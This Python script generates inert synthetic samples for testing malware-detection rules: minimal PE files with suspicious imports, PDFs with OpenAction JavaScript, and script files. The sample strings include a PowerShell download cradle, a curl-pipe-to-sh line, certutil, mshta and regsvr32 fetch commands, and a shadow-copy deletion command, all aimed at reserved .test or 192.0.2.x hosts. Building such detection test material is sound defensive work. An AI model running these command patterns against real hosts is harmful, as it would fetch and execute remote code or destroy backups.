"""
Builds the synthetic sample sets in samples/ (python3 scripts/make_synthetic.py).

Every file here is crafted to *look like* what detection rules hunt for, and is inert:
- PE files are real, parseable PE32 headers (the YARA `pe` module reads them: sections, imports,
  entry point) whose only code is a single `ret`; the "suspicious" parts are just names and strings;
- scripts and documents carry the patterns (encoded command, eval of base64, auto-open macro, PDF
  OpenAction) but their payload only prints "rulezet test";
- every domain is under .test / .invalid (reserved, never resolves) and every IP is in
  192.0.2.0/24 (TEST-NET-1, documentation only);
- no real malware, no exploit, no EICAR string, nothing an antivirus flags (checked with ClamAV:
  run `clamscan -r samples/` after any change), and nothing is downloaded.

Deterministic: the same files every time (fixed timestamps, seeded "random" data).
"""
import base64
import io
import json
import random
import struct
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1] / 'samples'
TIMESTAMP = 0x5F5E1000            # fixed, so the files never change between runs


# ── PE32 builder ─────────────────────────────────────────────────────────────────────

def _align(n, a):
    return (n + a - 1) // a * a


def build_pe(imports=None, sections=None, strings=(), subsystem=2, entropy_section=None, extra_rdata=b''):
    """A minimal valid PE32: .text holds one `ret` at the entry point, .rdata the import table
    and the given strings. imports: {'kernel32.dll': ['ExitProcess', ...]}.
    sections: names to use instead of ('.text', '.rdata') (e.g. UPX0 / UPX1).
    entropy_section: (name, size) of a section filled with seeded random bytes (looks packed)."""
    imports = imports or {'kernel32.dll': ['ExitProcess']}
    FA, SA, BASE = 0x200, 0x1000, 0x400000
    names = list(sections or ('.text', '.rdata'))
    text_rva, rdata_rva = SA, 2 * SA

    # import table inside .rdata
    dlls = list(imports.items())
    desc_size = 20 * (len(dlls) + 1)
    rdata = bytearray(desc_size)
    thunks_at = []
    for dll, funcs in dlls:
        ilt = len(rdata)
        rdata += b'\0' * 4 * (len(funcs) + 1)
        iat = len(rdata)
        rdata += b'\0' * 4 * (len(funcs) + 1)
        thunks_at.append((dll, funcs, ilt, iat))
    iat_start = thunks_at[0][3]
    iat_end = thunks_at[-1][3] + 4 * (len(thunks_at[-1][1]) + 1)
    for i, (dll, funcs, ilt, iat) in enumerate(thunks_at):
        name_rva = rdata_rva + len(rdata)
        rdata += dll.encode() + b'\0'
        for j, fn in enumerate(funcs):
            if len(rdata) % 2:
                rdata += b'\0'
            hint_rva = rdata_rva + len(rdata)
            rdata += struct.pack('<H', 0) + fn.encode() + b'\0'
            struct.pack_into('<I', rdata, ilt + 4 * j, hint_rva)
            struct.pack_into('<I', rdata, iat + 4 * j, hint_rva)
        struct.pack_into('<IIIII', rdata, 20 * i, rdata_rva + ilt, 0, 0, name_rva, rdata_rva + iat)
    import_size = desc_size
    for s in strings:
        rdata += b'\0' + (s if isinstance(s, bytes) else s.encode())
    rdata += extra_rdata + b'\0'

    text = b'\xC3'                                              # ret: the whole program
    raw = [(names[0], text_rva, text, 0x60000020),             # code, execute, read
           (names[1], rdata_rva, bytes(rdata), 0x40000040)]     # initialised data, read
    if entropy_section:
        name, size = entropy_section
        rnd = random.Random(name)
        raw.append((name, 3 * SA, bytes(rnd.getrandbits(8) for _ in range(size)), 0xE0000040))

    headers_size = _align(0x40 + 4 + 20 + 224 + 40 * len(raw), FA)
    offset, table, body = headers_size, b'', b''
    for name, rva, data, flags in raw:
        size = _align(len(data), FA)
        table += struct.pack('<8sIIIIIIHHI', name.encode()[:8], max(len(data), 1), rva, size, offset, 0, 0, 0, 0, flags)
        body += data.ljust(size, b'\0')
        offset += size
    image_size = _align(raw[-1][1] + max(len(raw[-1][2]), 1), SA)

    dirs = [(0, 0)] * 16
    dirs[1] = (rdata_rva, import_size)
    dirs[12] = (rdata_rva + iat_start, iat_end - iat_start)
    optional = struct.pack('<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII',
                           0x10B, 14, 0, FA, len(body) - FA, 0, text_rva, text_rva, rdata_rva, BASE, SA, FA,
                           6, 0, 0, 0, 6, 0, 0, image_size, headers_size, 0, subsystem, 0x8140,
                           0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    optional += b''.join(struct.pack('<II', *d) for d in dirs)
    coff = struct.pack('<HHIIIHH', 0x14C, len(raw), TIMESTAMP, 0, 0, len(optional), 0x0102)
    dos = bytearray(0x40)
    dos[0:2] = b'MZ'
    struct.pack_into('<I', dos, 0x3C, 0x40)
    head = bytes(dos) + b'PE\0\0' + coff + optional + table
    return head.ljust(headers_size, b'\0') + body


# ── documents ────────────────────────────────────────────────────────────────────────

def build_pdf(js):
    objs = [
        '<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>',
        '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>',
        f'<< /Type /Action /S /JavaScript /JS ({js}) >>',
    ]
    out = io.BytesIO()
    out.write(b'%PDF-1.4\n')
    offsets = []
    for i, o in enumerate(objs, 1):
        offsets.append(out.tell())
        out.write(f'{i} 0 obj\n{o}\nendobj\n'.encode())
    xref = out.tell()
    out.write(f'xref\n0 {len(objs) + 1}\n0000000000 65535 f \n'.encode())
    for off in offsets:
        out.write(f'{off:010d} 00000 n \n'.encode())
    out.write(f'trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n'.encode())
    return out.getvalue()


def build_zip(files):   # kept for future archive samples (check them with clamscan first)
    out = io.BytesIO()
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, data in files:
            info = zipfile.ZipInfo(name, date_time=(2020, 1, 1, 0, 0, 0))
            z.writestr(info, data)
    return out.getvalue()


def b64(text, utf16=False):
    return base64.b64encode(text.encode('utf-16-le' if utf16 else 'utf-8')).decode()


# ── the sets ─────────────────────────────────────────────────────────────────────────

def write_set(set_id, meta, samples):
    d = ROOT / set_id
    d.mkdir(parents=True, exist_ok=True)
    for old in d.iterdir():
        if old.is_file():
            old.unlink()
    (d / 'set.json').write_text(json.dumps({**meta, 'tlp': 'clear', 'source': 'rulezet-tester (scripts/make_synthetic.py)'}, indent=2) + '\n')
    listing = []
    for name, label, data in samples:
        (d / name).write_bytes(data if isinstance(data, bytes) else data.encode())
        listing.append({'file': name, 'label': label})
    (d / 'samples.json').write_text(json.dumps(listing, indent=2) + '\n')


def main():
    pe_minimal = build_pe()
    write_set('synthetic-pe', {
        'name': 'Synthetic — Windows PE', 'format': 'yara', 'kind': 'synthetic',
        'description': 'Parseable PE32 files whose only code is `ret`: a clean one, then one trait each '
                       '(injection imports, packer sections, downloader, ransom-note strings, dropper). Inert.',
        'labels': {'platform': 'windows', 'file_type': 'pe'},
    }, [
        ('pe_minimal.exe', 'Minimal PE (imports ExitProcess only)', pe_minimal),
        ('pe_injection_imports.exe', 'Process injection imports (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)',
         build_pe({'kernel32.dll': ['OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread', 'ExitProcess']})),
        ('pe_packed_upx_like.exe', 'Packer look-alike: UPX0 / UPX1 sections, "UPX!" marker, high-entropy section',
         build_pe(sections=('UPX0', 'UPX1'), strings=[b'UPX!'], entropy_section=('.rsrc', 4096))),
        ('pe_downloader.exe', 'Downloader traits: URLDownloadToFileA, WinINet imports, URL and user agent',
         build_pe({'kernel32.dll': ['ExitProcess', 'WinExec'], 'urlmon.dll': ['URLDownloadToFileA'],
                   'wininet.dll': ['InternetOpenA', 'InternetOpenUrlA']},
                  strings=['http://update.example-bad.test/stage2.bin', 'Mozilla/4.0 (compatible; MSIE 6.0; RulezetTest)'])),
        ('pe_ransom_strings.exe', 'Ransomware strings: ransom note, extension, shadow copy deletion (strings only)',
         build_pe({'kernel32.dll': ['ExitProcess', 'FindFirstFileW', 'FindNextFileW'], 'advapi32.dll': ['CryptEncrypt']},
                  strings=['YOUR FILES HAVE BEEN ENCRYPTED (rulezet test sample, nothing was encrypted)',
                           '.rulezet_locked', 'vssadmin.exe delete shadows /all /quiet',
                           'contact: recover@example-bad.invalid'])),
        ('pe_console_dropper.exe', 'Console PE with an embedded MZ blob (dropper look-alike)',
         build_pe(subsystem=3, extra_rdata=b'\0' * 16 + pe_minimal[:0x200])),
    ])

    write_set('synthetic-scripts', {
        'name': 'Synthetic — scripts', 'format': 'yara', 'kind': 'synthetic',
        'description': 'Script patterns (encoded PowerShell, download cradles, eval of base64, auto-open macro, '
                       'LOLBins). Payloads only print "rulezet test"; hosts are .test / 192.0.2.x. Never run them anyway.',
        'labels': {'file_type': 'script'},
    }, [
        ('powershell_encoded.ps1', 'PowerShell -EncodedCommand, hidden window',
         f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {b64(chr(87) + 'rite-Output rulezet-test', utf16=True)}\n"),
        ('powershell_cradle.ps1', 'PowerShell download cradle (IEX + Net.WebClient) to a TEST-NET address',
         "# rulezet test sample: never run\nIEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/rulezet-test.ps1')\n"),
        ('js_eval_atob.js', 'JavaScript eval(atob(...))',
         f"// rulezet test sample\nvar p = '{b64('console.log(\"rulezet test\")')}';\neval(atob(p));\n"),
        ('php_eval_base64.php', 'PHP eval(base64_decode(...)) (web shell pattern)',
         f"<?php\n// rulezet test sample\neval(base64_decode('{b64('echo \"rulezet test\";')}'));\n"),
        ('vba_autoopen.bas', 'VBA macro with AutoOpen and CreateObject("WScript.Shell")',
         'Attribute VB_Name = "RulezetTest"\nSub AutoOpen()\n    Dim s\n    Set s = CreateObject("WScript.Shell")\n'
         '    MsgBox "rulezet test"\nEnd Sub\n'),
        ('bash_curl_pipe.sh', 'curl | sh installer pattern to a .test domain',
         '#!/bin/sh\n# rulezet test sample: never run\ncurl -fsSL http://update.example-bad.test/install.sh | sh\n'),
        ('windows_lolbins.txt', 'LOLBin command lines (certutil, mshta, regsvr32) to TEST-NET addresses',
         'certutil.exe -urlcache -split -f http://192.0.2.20/rulezet-test.txt C:\\Users\\Public\\rulezet-test.txt\n'
         'mshta.exe http://192.0.2.21/rulezet-test.hta\n'
         'regsvr32.exe /s /n /u /i:http://192.0.2.22/rulezet-test.sct scrobj.dll\n'),
        ('plain_admin_script.ps1', 'Ordinary admin PowerShell (no suspicious pattern)',
         "Get-ChildItem -Path C:\\Logs -Filter *.log | Where-Object { $_.Length -gt 1MB } | Select-Object Name, Length\n"),
    ])

    write_set('synthetic-documents', {
        'name': 'Synthetic — documents', 'format': 'yara', 'kind': 'synthetic',
        'description': 'PDF with an OpenAction JavaScript (app.alert only), HTML smuggling page and a clean PDF. '
                       'Inert. (No "invoice.pdf.exe" in a ZIP: antivirus heuristics flag it even when it is harmless.)',
        'labels': {'file_type': 'document'},
    }, [
        ('pdf_openaction_js.pdf', 'PDF with /OpenAction /JavaScript (shows an alert)', build_pdf("app.alert('rulezet test')")),
        ('pdf_clean.pdf', 'Clean PDF (no action, no JavaScript)', build_pdf('').replace(b' /OpenAction 4 0 R', b'')),
        ('html_smuggling.html', 'HTML smuggling: base64 blob turned into a download (a text file)',
         '<!doctype html><html><body><script>\n// rulezet test sample\n'
         f"var d = atob('{b64('rulezet test file')}');\nvar b = new Blob([d], {{type: 'application/octet-stream'}});\n"
         "var a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'invoice.txt';\n"
         '</script></body></html>\n'),
    ])


if __name__ == '__main__':
    main()
    print(f'written to {ROOT}')
